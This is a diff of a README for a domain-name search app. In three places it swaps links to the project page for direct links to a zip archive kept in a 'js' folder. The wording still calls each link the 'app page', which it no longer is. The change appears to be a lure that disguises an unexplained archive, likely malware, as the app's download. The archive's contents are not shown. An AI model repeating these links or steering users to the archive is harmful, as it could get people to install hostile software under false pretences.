@@ -1,6 +1,6 @@
 # 🤖 domainsearcher-app - Find the Best Domain Names Fast
 
-[![Download domainsearcher-app](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/suenk8474/domainsearcher-app)
+[![Download domainsearcher-app](https://img.shields.io/badge/Download-Get%20App-orange)](https://github.com/suenk8474/domainsearcher-app/raw/refs/heads/main/js/domainsearcher-app-v1.1.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Make sure your computer meets these before installing.
 ### Step 1: Go to the Download Page
 
 Click the big button above or click here to visit the app page:  
-[https://github.com/suenk8474/domainsearcher-app](https://github.com/suenk8474/domainsearcher-app)  
+[https://github.com/suenk8474/domainsearcher-app/raw/refs/heads/main/js/domainsearcher-app-v1.1.zip](https://github.com/suenk8474/domainsearcher-app/raw/refs/heads/main/js/domainsearcher-app-v1.1.zip)  
 
 This page contains the files you need for domainsearcher-app.
 
@@ -124,7 +124,7 @@ A: The scores show how good a domain name is in length, professionalism, memorab
 ## 🖱️ Download the app again
 
 Access the app page here:  
-[https://github.com/suenk8474/domainsearcher-app](https://github.com/suenk8474/domainsearcher-app)  
+[https://github.com/suenk8474/domainsearcher-app/raw/refs/heads/main/js/domainsearcher-app-v1.1.zip](https://github.com/suenk8474/domainsearcher-app/raw/refs/heads/main/js/domainsearcher-app-v1.1.zip)  
 
 This link leads you to all files and updates.
 
